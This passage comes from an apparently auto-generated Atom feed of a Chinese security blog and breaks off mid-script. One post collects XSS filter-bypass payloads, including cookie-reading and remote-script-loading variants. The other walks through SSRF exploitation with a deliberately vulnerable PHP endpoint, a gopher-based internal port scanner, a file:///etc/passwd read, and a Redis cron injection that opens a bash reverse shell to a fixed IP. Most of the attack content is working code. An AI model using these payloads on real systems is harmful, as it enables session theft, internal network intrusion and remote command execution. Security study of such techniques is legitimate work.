    </summary>
    
      <category term="环境配置" scheme="https://zhengbao.wang/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="Linux错误" scheme="https://zhengbao.wang/tags/Linux%E9%94%99%E8%AF%AF/"/>
    
  </entry>
  
  <entry>
    <title>XSS姿势学习</title>
    <link href="https://zhengbao.wang/XSS%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
    <id>https://zhengbao.wang/XSS姿势学习/</id>
    <published>2019-06-17T13:24:21.000Z</published>
    <updated>2019-06-18T11:14:01.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间看到了<a href="https://nosec.org/home/detail/2654.html" target="_blank" rel="noopener">无需括号和分号的XSS</a>,最近又看了<a href="https://www.anquanke.com/post/id/180187" target="_blank" rel="noopener">利用JavaScript全局变量绕过XSS过滤器</a>,两篇均为译文，提出了一些非常有用的姿势，特此记录膜拜。另外文末贴有原文连接。</p><h2 id="0x01-无需括号和分号的XSS"><a href="#0x01-无需括号和分号的XSS" class="headerlink" title="0x01 无需括号和分号的XSS"></a>0x01 无需括号和分号的XSS</h2><p>早在几年前，作者就提到过在javascript中调用函数而无需括号的方法<br><code>&lt;script&gt;onerror=alert;throw 1337&lt;/script&gt;</code><br>该方法主要利用<code>onerror</code>和<code>throw</code>,工作原理是将onerror设置为你想调用的函数，然后用throw语句将参数传递给调用函数。在上面的payload中，因为throw是一个语句，在和onerror配合使用时需要用分号隔离，避免被包含。而语句隔离也可以使用花括号<code>{}</code>来实现:<br><code>&lt;script&gt;{onerror=alert}throw 1337&lt;/script&gt;</code><br>这样其实就已经达到作者标题所要的无需括号和分号的xss。<br>但是作者并没有停止，很快又提出了一万种姿势。<br>他发现<code>throw</code>语句可以接上一些表达式，那么这样就可以把<code>onerror</code>放在<code>throw</code>语句中进行赋值，并且throw表达式的<code>最后一部分</code>会被发送到onerror指定的处理函数中。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">throw</span> onerror=alert,a=<span class="string">'boogle'</span>,b=<span class="string">'1337'</span>,a</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/17/5d0712192c7ed21268.png" alt></p><p>如果想执行更复杂的语句，那么便可以使用<code>eval</code>函数，但是将上面的payload改为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert<span class="string">`xss`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里弹出的xss为一个字符串，可以使用破浪号包裹而不用括号，如果想要弹cookie，那么就要用到括号了<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>这种方式调用函数，那么显然还是需要<code>()</code>的。但是仔细观察前面的弹窗，我们传入内容为<code>boogle</code>,弹窗内容却为<code>Uncaught boogle</code><br>这样如果在传入的内容之前添加一个<code>=</code>,将会产生一个什么样的效果。<br>对，神奇的事情发生了，就像表面添加<code>=</code>一样，可以将<code>Uncaught</code>赋值为后面的内容，成为一个变量，那么这个变量就可以传入<code>eval</code>函数执行任意javascript代码了。<br>下面的payload中因为alert函数被引号包裹，可以将<code>()</code>编码为<code>\x28\x29</code>从而达到绕过效果。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span>%<span class="number">20</span>onerror=<span class="built_in">eval</span>,<span class="string">"=alert\x28document.cookie\x29"</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/17/5d077bc55e02d71577.png" alt><br>同样，前面的payload也可以这样变种,产生的效果及原理相同.<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span><span class="string">'=alert\x281337\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上面将<code>Uncaught</code>变为变量的方法是在<code>chrome</code>浏览器下实现的，而且在<code>Microsoft Edge</code>和<code>IE</code>下都能达到效果。但是当把这种方法拿到<code>firefox</code>浏览器时，却失败了，原因Firefox种报错前缀是<code>uncaught exception:</code>，代码最后执行赋值时会出现语法错误。<br><img src="https://i.loli.net/2019/06/17/5d077f0e2616657672.png" alt></p><p>但是很快作者给出了在<code>firefox</code>上的任意javascript执行的方法<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span>&#123;<span class="attr">lineNumber</span>:<span class="number">1</span>,<span class="attr">columnNumber</span>:<span class="number">1</span>,<span class="attr">fileName</span>:<span class="number">1</span>,<span class="attr">message</span>:<span class="string">'alert\x281\x29'</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br></pre></td></tr></table></figure></p><p>最终，作者更是贴出了一种无需字符串的通用payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">throw</span>/a/,Uncaught=<span class="number">1</span>,g=alert,a=URL%<span class="number">2b0</span>,onerror=<span class="built_in">eval</span>,/<span class="number">1</span>/g%2ba[<span class="number">12</span>]%2b[<span class="number">1337</span>]%2ba[<span class="number">13</span>]&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以看到，在该payloa中，作者非常巧妙的利用<code>a=URL+0</code>的方式将<code>function</code>与字符相加变为字符串，即a为<code>&quot;function URL() { [native code] }0&quot;</code>，然后从<code>a</code>取相应的字符使用。利用这种方式去拼接被过滤的关键词的确为一种很好的思路。<br><img src="https://i.loli.net/2019/06/17/5d078b1d0b5d277669.png" alt></p><p>还有通过使用类型错误自动将字符串发送到异常处理程序的方法，这使得我们完全不需要throw语句。<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>TypeError.prototype.name ='=/',0[<span class="string">onerror=eval</span>][<span class="symbol">'/-alert(1)//'</span>]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x02-利用JavaScript全局变量绕过XSS过滤器"><a href="#0x02-利用JavaScript全局变量绕过XSS过滤器" class="headerlink" title="0x02 利用JavaScript全局变量绕过XSS过滤器"></a>0x02 利用JavaScript全局变量绕过XSS过滤器</h2><p>这里所说的javascript全局变量是指利用<code>self</code>或者<code>window</code>调用任意javascript代码。<br><img src="https://i.loli.net/2019/06/17/5d078da09539397951.png" alt><br>比如说调用<code>alert</code>方法，可以使用<code>self[&quot;alert&quot;]</code><br><img src="https://i.loli.net/2019/06/17/5d078e1fe3a7988325.png" alt><br>如果alert关键词被过滤，使用全局变量的方法甚至可以使用字符串拼接<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>self[<span class="string">"al"+"ert"</span>](<span class="link">1</span>)<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>同样因为是在字符串中，可以使用十六进制编码、base64编码等<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/*</span><br><span class="line">** alert(document.cookie)</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">self["<span class="symbol">\x</span>61<span class="symbol">\x</span>6c<span class="symbol">\x</span>65<span class="symbol">\x</span>72<span class="symbol">\x</span>74"](</span><br><span class="line">    self["<span class="symbol">\x</span>64<span class="symbol">\x</span>6f<span class="symbol">\x</span>63<span class="symbol">\x</span>75<span class="symbol">\x</span>6d<span class="symbol">\x</span>65<span class="symbol">\x</span>6e<span class="symbol">\x</span>74"]</span><br><span class="line">        ["<span class="symbol">\x</span>63<span class="symbol">\x</span>6f<span class="symbol">\x</span>6f<span class="symbol">\x</span>6b<span class="symbol">\x</span>69<span class="symbol">\x</span>65"]</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>另外，网站中如果使用了jQuery之类的第三方库。可以利用这些第三方库中的全局变量<br>比如在JQuery中<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">self[<span class="string">"$"</span>][<span class="symbol">"globalEval"</span>]("alert(1)");</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">self[<span class="string">"\x24"</span>][<span class="symbol">"\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"</span>]</span><br><span class="line">("\x61\x6c\x65\x72\x74\x28\x31\x29");</span><br></pre></td></tr></table></figure></p><p>甚至可以使用<code>self[&quot;$&quot;][&quot;getScript&quot;](url)</code>来加载任意js文件<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self[<span class="string">"$"</span>][<span class="symbol">"getScript"</span>]("https://example.com/my.js");</span><br></pre></td></tr></table></figure></p><p>另外还可以使用javascript迭代器<code>Object.keys</code>和正则表达式的方法去获取指定函数。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a = function() &#123;</span><br><span class="line">    <span class="built_in">c</span>=<span class="number">0</span>; <span class="comment">// index counter</span></span><br><span class="line">    <span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(/^a[rel]+t$/.test(i)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">c</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">c</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// in one line</span></span><br><span class="line">a=()=&gt;&#123;<span class="built_in">c</span>=<span class="number">0</span>;<span class="keyword">for</span>(i <span class="keyword">in</span> <span class="keyword">self</span>)&#123;<span class="keyword">if</span>(/^a[rel]+t$/.test(i))&#123;<span class="keyword">return</span> <span class="built_in">c</span>&#125;<span class="built_in">c</span>++&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// then you can use a() with Object.keys</span></span><br><span class="line"><span class="comment">// alert("foo")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">self</span>[<span class="type">Object</span>.keys(<span class="keyword">self</span>)[a()]](<span class="string">"foo"</span>)</span><br></pre></td></tr></table></figure></p><p>使用这些方法，可以说可以在很大程度上绕过一些检测关键字黑名单的waf了。</p><p>如果与第一种方法相结合，更是可以组合出更有效的payload<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>throw/a/,Uncaught=1,g=alert,a=URL%2b0,self[<span class="string">`on`%2b`error`</span>]=eval,/1/g%2ba[<span class="string">12</span>]%2b"self[<span class="string">`document`</span>][<span class="symbol">`cookie`</span>]"%2ba[13]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span>TypeError.prototype.name="=/",0[<span class="string">self[`on`%2b`error`</span>]=self[<span class="string">"eval"</span>]][<span class="string">"/-self[`alert`</span>](<span class="link">self[`document`][`cookie`]</span>)//"]<span class="xml"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://portswigger.net/blog/xss-without-parentheses-and-semi-colons" target="_blank" rel="noopener">https://portswigger.net/blog/xss-without-parentheses-and-semi-colons</a><br><a href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/" target="_blank" rel="noopener">https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;前段时间看到了&lt;a href=&quot;https://nosec.org/home/detail/2654
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="xss" scheme="https://zhengbao.wang/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>SSRF的一些利用姿势</title>
    <link href="https://zhengbao.wang/SSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <id>https://zhengbao.wang/SSRF的一些利用姿势/</id>
    <published>2019-05-06T13:33:14.000Z</published>
    <updated>2019-05-06T13:34:42.692Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSRF（Server-Side RequestForgery）服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。<br>关于ssrf的利用，一般有下面几种</p><ul><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>利用 file 协议读取本地文件等</li><li>攻击运行在内网或本地的应用程序</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li></ul><p>本文漏洞环境使用如下代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $ch = curl_init();</span></span><br><span class="line"><span class="php">    curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">    curl_exec($ch);</span></span><br><span class="line"><span class="php">    curl_close($ch);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$url = $_GET[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">curl($url);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="0x01-协议探测"><a href="#0x01-协议探测" class="headerlink" title="0x01 协议探测"></a>0x01 协议探测</h2><p>在对ssrf漏洞深入利用之前首先要做协议探测，在只有知道其支持哪些协议的情况下，才可以利用这些协议进行进一步的利用。<br>协议探测的方法比较简单，可以在vps上监听一个端口，然后用相关协议尝试连接即可。<br>常见协议及可利用方向如下</p><ul><li>dict （操作Redis）</li><li>file （任意文件读取）</li><li>ftp、ftps （FTP爆破）</li><li>tftp（UDP协议扩展）</li><li>gopher （操作Redis、Memcached、fastcgi、mysql等）</li><li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li><li>rtsp</li><li>smb/smbs （连接SMB）</li><li>telnet – 连接SSH/Telnet</li><li>http、https – 内网服务探测<ul><li>网络服务探测</li><li>ShellShock命令执行</li><li>JBOSS远程Invoker war命令执行</li><li>Java调试接口命令执行</li><li>axis2-admin部署Server命令执行</li><li>Jenkins Scripts接口命令执行</li><li>Confluence SSRF</li><li>Struts2一堆命令执行</li><li>counchdb WEB API远程命令执行</li><li>mongodb SSRF</li><li>docker API远程命令执行</li><li>php_fpm/fastcgi 命令执行</li><li>tomcat命令执行</li><li>Elasticsearch引擎Groovy脚本命令执行</li><li>WebDav PUT上传任意文件</li><li>WebSphere Admin可部署war间接命令执行</li><li>Apache Hadoop远程命令执行</li><li>zentoPMS远程命令执行</li><li>HFS远程命令执行</li><li>glassfish任意文件读取和war文件部署间接命令执行</li></ul></li></ul><p>其中<code>file</code> <code>dict</code> <code>gopher</code> <code>http/https</code>较为常用，下面进行相应的实例演示</p><h2 id="0x02-内网端口探测"><a href="#0x02-内网端口探测" class="headerlink" title="0x02 内网端口探测"></a>0x02 内网端口探测</h2><p>端口探测又利于快速定位内网开启了哪些服务，以便用于后续进一步的利用<br>利用<code>dict</code> <code>ftp</code> <code>gopher</code> <code>telnet</code>等协议在端口开放和关闭连接时间的长短及返回banner的不同可判断端口是否开放以及可能存在的服务。当然端口的探测存在一些其他的因素导致结果误报，如网络状况服务器性能等都有可能影响连接的时间。<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line">import Queue</span><br><span class="line">lock = threading.Lock()</span><br><span class="line">threads_count = <span class="number">10</span></span><br><span class="line">scheme = 'gopher'</span><br><span class="line">ports = [<span class="number">21,22,23,25</span>,<span class="number">69,80,81,82</span>,<span class="number">83,84,110</span>,<span class="number">389,389</span>,<span class="number">443,445</span>,<span class="number">488,512</span>,<span class="number">513,514</span>,<span class="number">873,901</span>,<span class="number">1043,1080</span>,<span class="number">1099,1090</span>,<span class="number">1158,1352</span>,<span class="number">1433,1434</span>,<span class="number">1521,2049</span>,<span class="number">2100,2181</span>,<span class="number">2601,2604</span>,<span class="number">3128,3306</span>,<span class="number">3307,3389</span>,<span class="number">4440,4444</span>,<span class="number">4445,4848</span>,<span class="number">5000,5280</span>,<span class="number">5432,5500</span>,<span class="number">5632,5900</span>,<span class="number">5901,5902</span>,<span class="number">5903,5984</span>,<span class="number">6000,6033</span>,<span class="number">6082,6379</span>,<span class="number">6666,7001</span>,<span class="number">7001,7002</span>,<span class="number">7070,7101</span>,<span class="number">7676,7777</span>,<span class="number">7899,7988</span>,<span class="number">8000,8001</span>,<span class="number">8002,8003</span>,<span class="number">8004,8005</span>,<span class="number">8006,8007</span>,<span class="number">8008,8009</span>,<span class="number">8069,8080</span>,<span class="number">8081,8082</span>,<span class="number">8083,8084</span>,<span class="number">8085,8086</span>,<span class="number">8087,8088</span>,<span class="number">8089,8090</span>,<span class="number">8091,8092</span>,<span class="number">8093,8094</span>,<span class="number">8095,8098</span>,<span class="number">8099,8980</span>,<span class="number">8990,8443</span>,<span class="number">8686,8787</span>,<span class="number">8880,8888</span>,<span class="number">9000,9001</span>,<span class="number">9043,9045</span>,<span class="number">9060,9080</span>,<span class="number">9081,9088</span>,<span class="number">9088,9090</span>,<span class="number">9091,9100</span>,<span class="number">9200,9300</span>,<span class="number">9443,9871</span>,<span class="number">9999,10000</span>,<span class="number">10068,10086</span>,<span class="number">11211,20000</span>,<span class="number">22022,22222</span>,<span class="number">27017,28017</span>,<span class="number">50060,50070</span>]</span><br><span class="line">ip_block = '<span class="number">192.168.111</span>'</span><br><span class="line"></span><br><span class="line">class WyWorker(threading.Thread):</span><br><span class="line">    def __init__(self,queue):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.queue = queue</span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            if self.queue.empty():</span><br><span class="line">                break</span><br><span class="line">            try:</span><br><span class="line">                url = self.queue.get()</span><br><span class="line">                time.sleep(<span class="number">0</span>.<span class="number">3</span>)</span><br><span class="line">                r = requests.get(url,timeout=<span class="number">5</span>)</span><br><span class="line">                </span><br><span class="line">            except:</span><br><span class="line">                lock.acquire()</span><br><span class="line">                ip_port = url.split(':')</span><br><span class="line">                ip = ip_port[-<span class="number">2</span>][<span class="number">2</span>:]</span><br><span class="line">                port = ip_port[-<span class="number">1</span>]</span><br><span class="line">                print "[+]&#123;ip&#125; : &#123;port&#125;  Open".format(ip=ip,port=port)</span><br><span class="line">                lock.release()</span><br><span class="line"># payload queue                </span><br><span class="line">queue = Queue.Queue()</span><br><span class="line">for c in xrange(<span class="number">0</span>,<span class="number">255</span>):</span><br><span class="line">    ip = '&#123;<span class="number">0</span>&#125;.&#123;<span class="number">1</span>&#125;'.format(ip_block,c)</span><br><span class="line">    for port in ports:</span><br><span class="line"></span><br><span class="line">        payload = '&#123;scheme&#125;://&#123;ip&#125;:&#123;port&#125;'.format(</span><br><span class="line">            scheme=scheme,</span><br><span class="line">            ip=ip, </span><br><span class="line">            port=port</span><br><span class="line">            )</span><br><span class="line">        #print payload</span><br><span class="line">        url = "http://<span class="number">192.168.111.149</span>/ssrf.php?url=&#123;payload&#125;".format(payload=payload)</span><br><span class="line">        queue.put(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line">for i in xrange(threads_count):</span><br><span class="line">    threads.append(WyWorker(queue))</span><br><span class="line">for t in threads:</span><br><span class="line">    t.start()</span><br><span class="line">for t in threads:</span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line">while queue.qsize()&gt;<span class="number">0</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h2 id="0x03-file协议任意文件读取"><a href="#0x03-file协议任意文件读取" class="headerlink" title="0x03 file协议任意文件读取"></a>0x03 file协议任意文件读取</h2><p>当存在ssrf并file协议可用时，可以实现任意文件读取<br><code>file:///etc/passwd</code><br><img src="https://i.loli.net/2019/05/06/5cd02bfa2a7f4.png" alt></p><h2 id="0x04-gopher协议攻击内网redis"><a href="#0x04-gopher协议攻击内网redis" class="headerlink" title="0x04 gopher协议攻击内网redis"></a>0x04 gopher协议攻击内网redis</h2><p>当存在一个ssrf漏洞并且支持gopher协议时，可以攻击内网中存在未授权访问漏洞的redis以扩大战果。<br>要想利用<code>gopher</code>协议攻击redis，首先需要将请求转换为gopher协议所能理解的方式。<br>这里我们利用bash脚本对redis发出的访问请求，利用socat进行端口转发获取请求内容<br>下面是反弹shell的bash脚本<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!shell</span></span><br><span class="line">echo -e <span class="string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.111.145/2333 0&gt;&amp;1\n\n"</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="builtin-name">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span><span class="built_in"> config </span><span class="builtin-name">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span><span class="built_in"> config </span><span class="builtin-name">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br></pre></td></tr></table></figure></p><p>socat端口转发命令,该命令将请求的4444端口转发到6379端口，即我们请求4444端口相当于请求redis服务器的6379端口<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">socat</span> <span class="selector-tag">-v</span> <span class="selector-tag">tcp-listen</span><span class="selector-pseudo">:4444</span>,<span class="selector-tag">fork</span> <span class="selector-tag">tcp-connect</span><span class="selector-pseudo">:localhost</span><span class="selector-pseudo">:6379</span></span><br></pre></td></tr></table></figure></p><p>首先运行socat端口转发命令，等待端口转发。然后运行bash脚本<code>bash redis_exp.sh 127.0.0.1 4444</code>请求本地4444端口。<br>socat端会打印出redis交互过程<br><img src="https://i.loli.net/2019/05/04/5ccd8cfdb0544.png" alt><br>将内容复制到<code>redis.txt</code>，然后利用下面的python脚本将请求转化为gopher协议理解的内容</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">line</span> <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">line</span>[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            continue</span><br><span class="line">        elif <span class="built_in">line</span>[<span class="number">-3</span>:<span class="number">-1</span>] == r<span class="string">'\r'</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">line</span>) == <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">line</span> = <span class="built_in">line</span>.<span class="built_in">replace</span>(r<span class="string">'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="built_in">line</span> = <span class="built_in">line</span>.<span class="built_in">replace</span>(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="built_in">line</span></span><br><span class="line">        elif <span class="built_in">line</span> == <span class="string">'\x0a'</span>:</span><br><span class="line">            <span class="built_in">exp</span> = <span class="built_in">exp</span> + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span 